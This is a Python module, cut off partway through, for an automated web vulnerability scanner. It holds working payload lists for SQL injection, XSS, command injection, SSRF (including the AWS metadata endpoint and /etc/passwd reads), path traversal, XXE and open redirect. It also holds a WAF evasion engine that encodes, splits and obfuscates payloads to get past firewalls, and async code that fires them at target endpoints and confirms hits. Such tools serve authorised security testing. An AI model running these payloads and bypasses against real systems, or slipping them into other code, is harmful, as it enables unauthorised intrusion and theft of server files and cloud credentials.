"""
Advanced Vulnerability Scanner

This module provides comprehensive vulnerability scanning capabilities:
- Intelligent payload generation and testing
- WAF bypass techniques and evasion methods
- Context-aware vulnerability validation
- Advanced exploitation techniques
- Real-time vulnerability confirmation
"""

import asyncio
import aiohttp
import logging
import json
import re
import time
import random
import hashlib
import urllib.parse
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
import base64
import html
from collections import defaultdict

from .web_crawler import DiscoveredEndpoint, DiscoveredInput, InputType

class VulnerabilityType(Enum):
    """Types of vulnerabilities to test"""
    SQL_INJECTION = "sql_injection"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    SSTI = "server_side_template_injection"
    XXE = "xml_external_entity"
    SSRF = "server_side_request_forgery"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    IDOR = "insecure_direct_object_reference"
    CSRF = "cross_site_request_forgery"
    CLICKJACKING = "clickjacking"
    OPEN_REDIRECT = "open_redirect"
    HTTP_HEADER_INJECTION = "http_header_injection"
    DESERIALIZATION = "insecure_deserialization"

class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class VulnerabilityPayload:
    """Represents a vulnerability testing payload"""
    payload: str
    payload_type: VulnerabilityType
    description: str
    detection_patterns: List[str]
    blind_indicators: List[str] = field(default_factory=list)
    time_based: bool = False
    requires_encoding: bool = False
    waf_bypass: bool = False
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class VulnerabilityFinding:
    """Represents a confirmed vulnerability"""
    finding_id: str
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    endpoint: DiscoveredEndpoint
    parameter: DiscoveredInput
    payload_used: VulnerabilityPayload
    evidence: List[str]
    request_data: Dict[str, Any]
    response_data: Dict[str, Any]
    confidence: float
    impact: str
    remediation: str
    cwe_id: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

class PayloadGenerator:
    """Generates vulnerability testing payloads"""

    def __init__(self):
        self.payloads = self._load_payloads()
        self.encoders = self._load_encoders()

    def _load_payloads(self) -> Dict[VulnerabilityType, List[VulnerabilityPayload]]:
        """Load vulnerability testing payloads"""
        payloads = {}

        # SQL Injection payloads
        payloads[VulnerabilityType.SQL_INJECTION] = [
            VulnerabilityPayload(
                payload="' OR '1'='1",
                payload_type=VulnerabilityType.SQL_INJECTION,
                description="Basic SQL injection test",
                detection_patterns=["mysql", "sql", "syntax error", "ORA-", "Microsoft", "PostgreSQL"]
            ),
            VulnerabilityPayload(
                payload="' UNION SELECT 1,version(),3--",
                payload_type=VulnerabilityType.SQL_INJECTION,
                description="UNION-based SQL injection",
                detection_patterns=["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle"]
            ),
            VulnerabilityPayload(
                payload="'; WAITFOR DELAY '00:00:05'--",
                payload_type=VulnerabilityType.SQL_INJECTION,
                description="Time-based SQL injection",
                detection_patterns=[],
                time_based=True
            ),
            VulnerabilityPayload(
                payload="' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                payload_type=VulnerabilityType.SQL_INJECTION,
                description="MySQL time-based injection",
                detection_patterns=[],
                time_based=True
            ),
            VulnerabilityPayload(
                payload="' OR 1=1#",
                payload_type=VulnerabilityType.SQL_INJECTION,
                description="Comment-based SQL injection",
                detection_patterns=["mysql", "sql", "syntax"]
            )
        ]

        # XSS payloads
        payloads[VulnerabilityType.XSS_REFLECTED] = [
            VulnerabilityPayload(
                payload="<script>alert('XSS')</script>",
                payload_type=VulnerabilityType.XSS_REFLECTED,
                description="Basic XSS test",
                detection_patterns=["<script>alert('XSS')</script>"]
            ),
            VulnerabilityPayload(
                payload='"><script>alert(String.fromCharCode(88,83,83))</script>',
                payload_type=VulnerabilityType.XSS_REFLECTED,
                description="XSS with attribute break",
                detection_patterns=["alert(String.fromCharCode(88,83,83))"]
            ),
            VulnerabilityPayload(
                payload="javascript:alert('XSS')",
                payload_type=VulnerabilityType.XSS_REFLECTED,
                description="JavaScript URL XSS",
                detection_patterns=["javascript:alert('XSS')"]
            ),
            VulnerabilityPayload(
                payload="<img src=x onerror=alert('XSS')>",
                payload_type=VulnerabilityType.XSS_REFLECTED,
                description="Image onerror XSS",
                detection_patterns=["<img src=x onerror=alert('XSS')>"]
            ),
            VulnerabilityPayload(
                payload="<svg onload=alert('XSS')>",
                payload_type=VulnerabilityType.XSS_REFLECTED,
                description="SVG onload XSS",
                detection_patterns=["<svg onload=alert('XSS')>"]
            )
        ]

        # Command injection payloads
        payloads[VulnerabilityType.COMMAND_INJECTION] = [
            VulnerabilityPayload(
                payload="; ls -la",
                payload_type=VulnerabilityType.COMMAND_INJECTION,
                description="Basic command injection",
                detection_patterns=["total", "drwx", "bin", "etc", "tmp"]
            ),
            VulnerabilityPayload(
                payload="| whoami",
                payload_type=VulnerabilityType.COMMAND_INJECTION,
                description="Pipe command injection",
                detection_patterns=["root", "admin", "user", "www-data"]
            ),
            VulnerabilityPayload(
                payload="& ping -c 3 127.0.0.1",
                payload_type=VulnerabilityType.COMMAND_INJECTION,
                description="Network command injection",
                detection_patterns=["64 bytes", "ping", "127.0.0.1", "packets transmitted"]
            ),
            VulnerabilityPayload(
                payload="`id`",
                payload_type=VulnerabilityType.COMMAND_INJECTION,
                description="Backtick command injection",
                detection_patterns=["uid=", "gid=", "groups="]
            ),
            VulnerabilityPayload(
                payload="$(sleep 5)",
                payload_type=VulnerabilityType.COMMAND_INJECTION,
                description="Time-based command injection",
                detection_patterns=[],
                time_based=True
            )
        ]

        # SSRF payloads
        payloads[VulnerabilityType.SSRF] = [
            VulnerabilityPayload(
                payload="http://127.0.0.1:80",
                payload_type=VulnerabilityType.SSRF,
                description="Basic SSRF test",
                detection_patterns=["Apache", "nginx", "IIS", "default", "index"]
            ),
            VulnerabilityPayload(
                payload="http://169.254.169.254/latest/meta-data/",
                payload_type=VulnerabilityType.SSRF,
                description="AWS metadata SSRF",
                detection_patterns=["ami-id", "instance-id", "security-groups", "iam"]
            ),
            VulnerabilityPayload(
                payload="file:///etc/passwd",
                payload_type=VulnerabilityType.SSRF,
                description="File protocol SSRF",
                detection_patterns=["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"]
            ),
            VulnerabilityPayload(
                payload="http://localhost:22",
                payload_type=VulnerabilityType.SSRF,
                description="Port scan SSRF",
                detection_patterns=["SSH", "OpenSSH", "protocol"]
            )
        ]

        # Directory traversal payloads
        payloads[VulnerabilityType.DIRECTORY_TRAVERSAL] = [
            VulnerabilityPayload(
                payload="../../../etc/passwd",
                payload_type=VulnerabilityType.DIRECTORY_TRAVERSAL,
                description="Unix path traversal",
                detection_patterns=["root:", "bin:", "daemon:", "/bin/bash"]
            ),
            VulnerabilityPayload(
                payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                payload_type=VulnerabilityType.DIRECTORY_TRAVERSAL,
                description="Windows path traversal",
                detection_patterns=["127.0.0.1", "localhost", "::1"]
            ),
            VulnerabilityPayload(
                payload="....//....//....//etc/passwd",
                payload_type=VulnerabilityType.DIRECTORY_TRAVERSAL,
                description="Double encoding traversal",
                detection_patterns=["root:", "bin:", "daemon:"]
            ),
            VulnerabilityPayload(
                payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                payload_type=VulnerabilityType.DIRECTORY_TRAVERSAL,
                description="URL encoded traversal",
                detection_patterns=["root:", "bin:", "daemon:"],
                requires_encoding=False  # Already encoded
            )
        ]

        # XXE payloads
        payloads[VulnerabilityType.XXE] = [
            VulnerabilityPayload(
                payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                payload_type=VulnerabilityType.XXE,
                description="Basic XXE test",
                detection_patterns=["root:", "bin:", "daemon:"]
            ),
            VulnerabilityPayload(
                payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:80">]><root>&test;</root>',
                payload_type=VulnerabilityType.XXE,
                description="XXE with HTTP request",
                detection_patterns=["Apache", "nginx", "IIS"]
            )
        ]

        # SSTI payloads
        payloads[VulnerabilityType.SSTI] = [
            VulnerabilityPayload(
                payload="{{7*7}}",
                payload_type=VulnerabilityType.SSTI,
                description="Basic SSTI test",
                detection_patterns=["49"]
            ),
            VulnerabilityPayload(
                payload="${7*7}",
                payload_type=VulnerabilityType.SSTI,
                description="JSP SSTI test",
                detection_patterns=["49"]
            ),
            VulnerabilityPayload(
                payload="<%= 7*7 %>",
                payload_type=VulnerabilityType.SSTI,
                description="ERB SSTI test",
                detection_patterns=["49"]
            ),
            VulnerabilityPayload(
                payload="{{config.items()}}",
                payload_type=VulnerabilityType.SSTI,
                description="Flask config disclosure",
                detection_patterns=["SECRET_KEY", "DEBUG", "config"]
            )
        ]

        # Open redirect payloads
        payloads[VulnerabilityType.OPEN_REDIRECT] = [
            VulnerabilityPayload(
                payload="http://evil.com",
                payload_type=VulnerabilityType.OPEN_REDIRECT,
                description="Basic open redirect",
                detection_patterns=["Location: http://evil.com", "redirect"]
            ),
            VulnerabilityPayload(
                payload="//evil.com",
                payload_type=VulnerabilityType.OPEN_REDIRECT,
                description="Protocol relative redirect",
                detection_patterns=["Location: //evil.com"]
            ),
            VulnerabilityPayload(
                payload="javascript:alert('redirect')",
                payload_type=VulnerabilityType.OPEN_REDIRECT,
                description="JavaScript redirect",
                detection_patterns=["javascript:alert"]
            )
        ]

        return payloads

    def _load_encoders(self) -> Dict[str, callable]:
        """Load payload encoders"""
        return {
            'url': urllib.parse.quote,
            'html': html.escape,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x))
        }

    def get_payloads(self, vuln_type: VulnerabilityType,
                    include_waf_bypass: bool = True) -> List[VulnerabilityPayload]:
        """Get payloads for vulnerability type"""
        base_payloads = self.payloads.get(vuln_type, [])

        if not include_waf_bypass:
            return base_payloads

        # Generate WAF bypass variants
        bypass_payloads = []
        for payload in base_payloads:
            bypass_payloads.extend(self._generate_waf_bypass_variants(payload))

        return base_payloads + bypass_payloads

    def _generate_waf_bypass_variants(self, original_payload: VulnerabilityPayload) -> List[VulnerabilityPayload]:
        """Generate WAF bypass variants of payload"""
        variants = []
        base_payload = original_payload.payload

        # Case variation
        if original_payload.payload_type in [VulnerabilityType.XSS_REFLECTED, VulnerabilityType.SSTI]:
            case_variant = VulnerabilityPayload(
                payload=self._randomize_case(base_payload),
                payload_type=original_payload.payload_type,
                description=f"Case variation: {original_payload.description}",
                detection_patterns=original_payload.detection_patterns,
                waf_bypass=True
            )
            variants.append(case_variant)

        # Encoding variants
        for encoding_name, encoder in self.encoders.items():
            if encoding_name in ['url', 'hex']:  # Most common for bypasses
                try:
                    encoded_payload = encoder(base_payload)
                    encoded_variant = VulnerabilityPayload(
                        payload=encoded_payload,
                        payload_type=original_payload.payload_type,
                        description=f"{encoding_name} encoded: {original_payload.description}",
                        detection_patterns=original_payload.detection_patterns,
                        waf_bypass=True
                    )
                    variants.append(encoded_variant)
                except Exception:
                    continue

        # Comment insertion (for SQL injection)
        if original_payload.payload_type == VulnerabilityType.SQL_INJECTION:
            comment_variant = VulnerabilityPayload(
                payload=self._insert_sql_comments(base_payload),
                payload_type=original_payload.payload_type,
                description=f"Comment obfuscated: {original_payload.description}",
                detection_patterns=original_payload.detection_patterns,
                waf_bypass=True
            )
            variants.append(comment_variant)

        return variants

    def _randomize_case(self, payload: str) -> str:
        """Randomize case of payload"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def _insert_sql_comments(self, payload: str) -> str:
        """Insert SQL comments to obfuscate payload"""
        # Insert /**/ comments randomly
        chars = list(payload)
        comment_positions = random.sample(range(len(chars)), min(3, len(chars) // 3))

        for pos in sorted(comment_positions, reverse=True):
            chars.insert(pos, '/**/')

        return ''.join(chars)

class WAFBypassEngine:
    """Handles WAF detection and bypass techniques"""

    def __init__(self):
        self.waf_signatures = self._load_waf_signatures()
        self.bypass_techniques = self._load_bypass_techniques()

    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load WAF detection signatures"""
        return {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id'],
            'akamai': ['akamai', 'x-akamai'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'sucuri': ['x-sucuri-id', 'sucuri'],
            'barracuda': ['barra', 'barracuda'],
            'fortinet': ['fortigate', 'fortiweb'],
            'mod_security': ['mod_security', 'modsecurity']
        }

    def _load_bypass_techniques(self) -> Dict[str, List[callable]]:
        """Load WAF bypass techniques"""
        return {
            'payload_fragmentation': [self._fragment_payload],
            'case_variation': [self._vary_case],
            'encoding_variation': [self._vary_encoding],
            'comment_insertion': [self._insert_comments],
            'parameter_pollution': [self._pollute_parameters],
            'unicode_normalization': [self._unicode_normalize],
            'request_method_override': [self._override_method]
        }

    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> Optional[str]:
        """Detect WAF based on response"""
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        body_lower = response_body.lower()

        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                # Check headers
                for header_name, header_value in headers_lower.items():
                    if signature in header_name or signature in header_value:
                        return waf_name

                # Check body
                if signature in body_lower:
                    return waf_name

        return None

    def generate_bypass_variants(self, payload: str, detected_waf: Optional[str] = None) -> List[str]:
        """Generate WAF bypass variants"""
        variants = [payload]  # Include original

        # Apply all bypass techniques
        for technique_name, techniques in self.bypass_techniques.items():
            for technique in techniques:
                try:
                    variant = technique(payload)
                    if variant and variant != payload:
                        variants.append(variant)
                except Exception:
                    continue

        return variants

    def _fragment_payload(self, payload: str) -> str:
        """Fragment payload across multiple parameters"""
        if len(payload) < 4:
            return payload

        mid = len(payload) // 2
        return f"{payload[:mid]}' + '{payload[mid:]}"

    def _vary_case(self, payload: str) -> str:
        """Vary case of payload"""
        return ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )

    def _vary_encoding(self, payload: str) -> str:
        """Apply mixed encoding"""
        encoded = []
        for i, c in enumerate(payload):
            if i % 3 == 0:
                encoded.append(f'%{ord(c):02x}')
            elif i % 3 == 1:
                encoded.append(c)
            else:
                encoded.append(f'&#x{ord(c):02x};')
        return ''.join(encoded)

    def _insert_comments(self, payload: str) -> str:
        """Insert comments to break up payload"""
        if 'script' in payload.lower():
            return payload.replace('script', 'scr/**/ipt')
        elif 'union' in payload.lower():
            return payload.replace('union', 'uni/**/on')
        elif 'select' in payload.lower():
            return payload.replace('select', 'sel/**/ect')
        return payload

    def _pollute_parameters(self, payload: str) -> str:
        """Add parameter pollution"""
        return f"dummy=value&{payload}&dummy2=value2"

    def _unicode_normalize(self, payload: str) -> str:
        """Apply unicode normalization"""
        # Replace some characters with unicode equivalents
        replacements = {
            'a': '\u0061',
            'e': '\u0065',
            'i': '\u0069',
            'o': '\u006f',
            'u': '\u0075'
        }

        result = payload
        for char, unicode_char in replacements.items():
            if char in result:
                result = result.replace(char, unicode_char, 1)
                break

        return result

    def _override_method(self, payload: str) -> str:
        """This would be applied at request level"""
        return payload

class VulnerabilityValidator:
    """Validates and confirms vulnerabilities"""

    def __init__(self):
        self.validation_patterns = self._load_validation_patterns()

    def _load_validation_patterns(self) -> Dict[VulnerabilityType, Dict[str, Any]]:
        """Load vulnerability validation patterns"""
        return {
            VulnerabilityType.SQL_INJECTION: {
                'error_patterns': [
                    r'SQL syntax.*MySQL',
                    r'Warning.*mysql_.*',
                    r'MySQLSyntaxErrorException',
                    r'PostgreSQL.*ERROR',
                    r'Warning.*pg_.*',
                    r'valid MySQL result',
                    r'ORA-[0-9]{5}',
                    r'Microsoft.*ODBC.*SQL Server',
                    r'SQLServer JDBC Driver'
                ],
                'success_indicators': [
                    r'MySQL.*version',
                    r'PostgreSQL.*version',
                    r'Microsoft SQL Server.*version'
                ],
                'time_threshold': 4.0
            },
            VulnerabilityType.XSS_REFLECTED: {
                'reflection_patterns': [
                    r'<script[^>]*>alert\([^)]*\)</script>',
                    r'javascript:alert\([^)]*\)',
                    r'onerror\s*=\s*["\']?alert\([^)]*\)',
                    r'onload\s*=\s*["\']?alert\([^)]*\)'
                ],
                'context_breaks': [
                    r'"><script',
                    r"'><script",
                    r'</[^>]*><script'
                ]
            },
            VulnerabilityType.COMMAND_INJECTION: {
                'output_patterns': [
                    r'total \d+',  # ls output
                    r'uid=\d+.*gid=\d+',  # id output
                    r'[drwx-]{10}',  # ls -l output
                    r'\d+ packets transmitted',  # ping output
                    r'PING [^\s]+',  # ping header
                ],
                'time_threshold': 4.0
            },
            VulnerabilityType.SSRF: {
                'response_patterns': [
                    r'Apache.*Server',
                    r'nginx.*',
                    r'IIS.*',
                    r'ami-[a-z0-9]+',  # AWS metadata
                    r'instance-id',
                    r'security-groups',
                    r'root:.*:0:0:',  # /etc/passwd
                    r'SSH.*OpenSSH'
                ]
            },
            VulnerabilityType.DIRECTORY_TRAVERSAL: {
                'file_patterns': [
                    r'root:.*:0:0:',  # /etc/passwd
                    r'bin:.*:/bin/',
                    r'daemon:.*:/usr/sbin/',
                    r'127\.0\.0\.1.*localhost',  # hosts file
                    r'::1.*localhost'
                ]
            }
        }

    def validate_vulnerability(self, vuln_type: VulnerabilityType,
                             payload: VulnerabilityPayload,
                             response_data: Dict[str, Any],
                             baseline_response: Optional[Dict[str, Any]] = None) -> Tuple[bool, float, List[str]]:
        """Validate if vulnerability exists"""

        response_body = response_data.get('body', '')
        response_headers = response_data.get('headers', {})
        response_time = response_data.get('response_time', 0)
        status_code = response_data.get('status_code', 200)

        evidence = []
        confidence = 0.0

        validation_config = self.validation_patterns.get(vuln_type, {})

        # Time-based validation
        if payload.time_based:
            time_threshold = validation_config.get('time_threshold', 4.0)
            if response_time >= time_threshold:
                confidence += 0.7
                evidence.append(f"Time delay detected: {response_time:.2f}s")

                # Compare with baseline if available
                if baseline_response:
                    baseline_time = baseline_response.get('response_time', 0)
                    time_diff = response_time - baseline_time
                    if time_diff >= time_threshold:
                        confidence += 0.2
                        evidence.append(f"Significant time difference from baseline: {time_diff:.2f}s")

        # Pattern-based validation
        error_patterns = validation_config.get('error_patterns', [])
        for pattern in error_patterns:
            matches = re.findall(pattern, response_body, re.IGNORECASE)
            if matches:
                confidence += 0.3
                evidence.append(f"Error pattern match: {pattern}")

        success_patterns = validation_config.get('success_indicators', [])
        for pattern in success_patterns:
            matches = re.findall(pattern, response_body, re.IGNORECASE)
            if matches:
                confidence += 0.5
                evidence.append(f"Success indicator: {pattern}")

        # XSS-specific validation
        if vuln_type == VulnerabilityType.XSS_REFLECTED:
            reflection_patterns = validation_config.get('reflection_patterns', [])
            for pattern in reflection_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    confidence += 0.6
                    evidence.append(f"XSS payload reflected: {pattern}")

            # Check for payload in original form
            if payload.payload in response_body:
                confidence += 0.4
                evidence.append("Payload reflected without encoding")

        # Command injection validation
        if vuln_type == VulnerabilityType.COMMAND_INJECTION:
            output_patterns = validation_config.get('output_patterns', [])
            for pattern in output_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    confidence += 0.6
                    evidence.append(f"Command output detected: {pattern}")

        # SSRF validation
        if vuln_type == VulnerabilityType.SSRF:
            response_patterns = validation_config.get('response_patterns', [])
            for pattern in response_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    confidence += 0.5
                    evidence.append(f"SSRF response pattern: {pattern}")

        # Directory traversal validation
        if vuln_type == VulnerabilityType.DIRECTORY_TRAVERSAL:
            file_patterns = validation_config.get('file_patterns', [])
            for pattern in file_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    confidence += 0.7
                    evidence.append(f"File content detected: {pattern}")

        # Status code analysis
        if status_code == 500:
            confidence += 0.1
            evidence.append("Server error (500) response")
        elif status_code in [403, 406]:
            confidence -= 0.2  # Might indicate WAF blocking
            evidence.append(f"Blocked response ({status_code})")

        # Header analysis
        for header_name, header_value in response_headers.items():
            if 'error' in header_value.lower() or 'exception' in header_value.lower():
                confidence += 0.1
                evidence.append(f"Error in header: {header_name}")

        # Normalize confidence
        confidence = min(confidence, 1.0)

        # Determine if vulnerability is confirmed
        is_vulnerable = confidence >= 0.5

        return is_vulnerable, confidence, evidence

class AdvancedVulnerabilityScanner:
    """Main vulnerability scanner"""

    def __init__(self, max_concurrent: int = 5, request_delay: float = 0.5):
        self.max_concurrent = max_concurrent
        self.request_delay = request_delay

        self.payload_generator = PayloadGenerator()
        self.waf_bypass = WAFBypassEngine()
        self.validator = VulnerabilityValidator()

        self.session = None
        self.scan_statistics = {
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0,
            'waf_detected': False,
            'scan_duration': 0
        }

    async def scan_endpoints(self, endpoints: List[DiscoveredEndpoint],
                           vulnerability_types: Optional[List[VulnerabilityType]] = None) -> List[VulnerabilityFinding]:
        """Scan endpoints for vulnerabilities"""

        if vulnerability_types is None:
            vulnerability_types = list(VulnerabilityType)

        start_time = time.time()
        findings = []

        # Initialize session
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

        try:
            # Create scanning tasks
            tasks = []
            for endpoint in endpoints:
                for vuln_type in vulnerability_types:
                    task = self._scan_endpoint_for_vulnerability(endpoint, vuln_type)
                    tasks.append(task)

            # Execute scans with concurrency limit
            semaphore = asyncio.Semaphore(self.max_concurrent)
            async def bounded_scan(task):
                async with semaphore:
                    return await task

            results = await asyncio.gather(*[bounded_scan(task) for task in tasks], return_exceptions=True)

            # Process results
            for result in results:
                if isinstance(result, Exception):
                    logging.error(f"Scan error: {result}")
                elif result:
                    findings.extend(result)

            self.scan_statistics['scan_duration'] = time.time() - start_time
            self.scan_statistics['vulnerabilities_found'] = len(findings)

            logging.info(f"Scan completed: {len(findings)} vulnerabilities found in {self.scan_statistics['scan_duration']:.2f}s")

        finally:
            if self.session:
                await self.session.close()

        return findings

    async def _scan_endpoint_for_vulnerability(self, endpoint: DiscoveredEndpoint,
                                             vuln_type: VulnerabilityType) -> List[VulnerabilityFinding]:
        """Scan single endpoint for specific vulnerability type"""
        findings = []

        # Get payloads for vulnerability type
        payloads = self.payload_generator.get_payloads(vuln_type)

        # Get baseline response
        baseline_response = await self._get_baseline_response(endpoint)

        # Test each payload
        for payload in payloads:
            if not endpoint.parameters:
                # Try URL-based testing
                finding = await self._test_url_vulnerability(endpoint, payload, baseline_response)
                if finding:
                    findings.append(finding)
            else:
                # Test each parameter
                for parameter in endpoint.parameters:
                    if self._is_parameter_testable(parameter, vuln_type):
                        finding = await self._test_parameter_vulnerability(
                            endpoint, parameter, payload, baseline_response
                        )
                        if finding:
                            findings.append(finding)

        return findings

    async def _get_baseline_response(self, endpoint: DiscoveredEndpoint) -> Optional[Dict[str, Any]]:
        """Get baseline response for comparison"""
        try:
            start_time = time.time()

            if endpoint.method.upper() == 'GET':
                async with self.session.get(endpoint.url) as response:
                    body = await response.text()
                    end_time = time.time()

                    return {
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'body': body,
                        'response_time': end_time - start_time
                    }
            else:
                # For POST requests, send with empty/default data
                data = {}
                for param in endpoint.parameters:
                    data[param.name] = param.default_value or 'test'

                async with self.session.post(endpoint.url, data=data) as response:
                    body = await response.text()
                    end_time = time.time()

                    return {
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'body': body,
                        'response_time': end_time - start_time
                    }

        except Exception as e:
            logging.error(f"Failed to get baseline response: {e}")
            return None

    async def _test_url_vulnerability(self, endpoint: DiscoveredEndpoint,
                                    payload: VulnerabilityPayload,
                                    baseline_response: Optional[Dict[str, Any]]) -> Optional[VulnerabilityFinding]:
        """Test URL-based vulnerability"""
        try:
            # Append payload to URL
            if '?' in endpoint.url:
                test_url = f"{endpoint.url}&test={urllib.parse.quote(payload.payload)}"
            else:
                test_url = f"{endpoint.url}?test={urllib.parse.quote(payload.payload)}"

            response_data = await self._send_request(test_url, 'GET', {})

            if response_data:
                is_vulnerable, confidence, evidence = self.validator.validate_vulnerability(
                    payload.payload_type, payload, response_data, baseline_response
                )

                if is_vulnerable:
                    return self._create_finding(
                        endpoint, None, payload, response_data, confidence, evidence
                    )

        except Exception as e:
            logging.error(f"URL vulnerability test error: {e}")

        return None

    async def _test_parameter_vulnerability(self, endpoint: DiscoveredEndpoint,
                                          parameter: DiscoveredInput,
                                          payload: VulnerabilityPayload,
                                          baseline_response: Optional[Dict[str, Any]]) -> Optional[VulnerabilityFinding]:
        """Test parameter-specific vulnerability"""
        try:
            # Prepare request data
            data = {}
            for param in endpoint.parameters:
                if param.name == parameter.name:
                    data[param.name] = payload.payload
                else:
                    data[param.name] = param.default_value or 'test'

            # Send request
            if endpoint.method.upper() == 'GET':
                url_with_params = f"{endpoint.url}?" + urllib.parse.urlencode(data)
                response_data = await self._send_request(url_with_params, 'GET', {})
            else:
                response_data = await self._send_request(endpoint.url, endpoint.method, data)

            if response_data:
                # Check for WAF
                detected_waf = self.waf_bypass.detect_waf(
                    response_data.get('headers', {}),
                    response_data.get('body', '')
                )

                if detected_waf:
                    self.scan_statistics['waf_detected'] = True
                    logging.info(f"WAF detected: {detected_waf}")

                    # Try WAF bypass variants
                    bypass_variants = self.waf_bypass.generate_bypass_variants(payload.payload, detected_waf)
                    for variant_payload in bypass_variants:
                        variant_data = data.copy()
                        variant_data[parameter.name] = variant_payload

                        if endpoint.method.upper() == 'GET':
                            variant_url = f"{endpoint.url}?" + urllib.parse.urlencode(variant_data)
                            variant_response = await self._send_request(variant_url, 'GET', {})
                        else:
                            variant_response = await self._send_request(endpoint.url, endpoint.method, variant_data)

                        if variant_response:
                            is_vulnerable, confidence, evidence = self.validator.validate_vulnerability(
                                payload.payload_type, payload, variant_response, baseline_response
                            )

                            if is_vulnerable:
                                # Create modified payload object for WAF bypass
                                bypass_payload = VulnerabilityPayload(
                                    payload=variant_payload,
                                    payload_type=payload.payload_type,
                                    description=f"WAF bypass variant: {payload.description}",
                                    detection_patterns=payload.detection_patterns,
                                    waf_bypass=True
                                )

                                return self._create_finding(
                                    endpoint, parameter, bypass_payload, variant_response, confidence, evidence
                                )

                # Validate original payload
                is_vulnerable, confidence, evidence = self.validator.validate_vulnerability(
                    payload.payload_type, payload, response_data, baseline_response
                )

                if is_vulnerable:
                    return self._create_finding(
                        endpoint, parameter, payload, response_data, confidence, evidence
                    )

        except Exception as e:
            logging.error(f"Parameter vulnerability test error: {e}")

        return None

    async def _send_request(self, url: str, method: str, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send HTTP request and return response data"""
        try:
            await asyncio.sleep(self.request_delay)
            start_time = time.time()

            if method.upper() == 'GET':
                async with self.session.get(url) as response:
                    body = await response.text()
                    end_time = time.time()
            else:
                async with self.session.post(url, data=data) as response:
                    body = await response.text()
                    end_time = time.time()

            self.scan_statistics['requests_sent'] += 1

            return {
                'status_code': response.status,
                'headers': dict(response.headers),
                'body': body,
                'response_time': end_time - start_time,
                'url': str(response.url)
            }

        except Exception as e:
            logging.error(f"Request failed: {e}")
            return None

    def _is_parameter_testable(self, parameter: DiscoveredInput, vuln_type: VulnerabilityType) -> bool:
        """Determine if parameter is suitable for vulnerability type"""
        param_name = parameter.name.lower()

        # Skip CSRF tokens and session identifiers for most tests
        if any(skip_word in param_name for skip_word in ['csrf', 'token', 'session', 'nonce']):
            return vuln_type in [VulnerabilityType.CSRF]

        # File parameters are good for path traversal and inclusion
        if any(file_word in param_name for file_word in ['file', 'path', 'doc', 'page']):
            return vuln_type in [VulnerabilityType.DIRECTORY_TRAVERSAL, VulnerabilityType.LFI, VulnerabilityType.RFI]

        # URL parameters are good for SSRF and open redirect
        if any(url_word in param_name for url_word in ['url', 'link', 'redirect', 'callback']):
            return vuln_type in [VulnerabilityType.SSRF, VulnerabilityType.OPEN_REDIRECT]

        # Search parameters are good for XSS and injection
        if any(search_word in param_name for search_word in ['search', 'query', 'q', 'keyword']):
            return vuln_type in [VulnerabilityType.XSS_REFLECTED, VulnerabilityType.SQL_INJECTION, VulnerabilityType.SSTI]

        # Most parameters can be tested for common vulnerabilities
        return vuln_type in [
            VulnerabilityType.XSS_REFLECTED,
            VulnerabilityType.SQL_INJECTION,
            VulnerabilityType.COMMAND_INJECTION,
            VulnerabilityType.SSTI
        ]

    def _create_finding(self, endpoint: DiscoveredEndpoint,
                       parameter: Optional[DiscoveredInput],
                       payload: VulnerabilityPayload,
                       response_data: Dict[str, Any],
                       confidence: float,
                       evidence: List[str]) -> VulnerabilityFinding:
        """Create vulnerability finding"""

        finding_id = hashlib.md5(
            f"{endpoint.url}:{parameter.name if parameter else 'url'}:{payload.payload_type.value}".encode()
        ).hexdigest()[:16]

        # Determine severity
        severity_map = {
            VulnerabilityType.SQL_INJECTION: SeverityLevel.CRITICAL,
            VulnerabilityType.COMMAND_INJECTION: SeverityLevel.CRITICAL,
            VulnerabilityType.XXE: SeverityLevel.HIGH,
            VulnerabilityType.SSRF: SeverityLevel.HIGH,
            VulnerabilityType.XSS_REFLECTED: SeverityLevel.MEDIUM,
